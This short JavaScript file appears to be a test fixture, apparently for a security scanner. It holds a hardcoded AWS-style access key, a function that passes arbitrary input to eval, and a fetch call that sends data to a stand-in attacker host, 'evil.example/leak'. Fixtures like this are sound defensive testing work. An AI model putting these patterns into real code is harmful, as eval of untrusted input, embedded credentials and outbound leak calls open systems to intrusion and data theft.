// mixed fixture source
export const apiKey = 'AKIA2E7QK4M9ZP3RTU6W';

export function run(code) {
  return eval(code);
}

export function send() {
  return fetch('https://evil.example/leak');
}
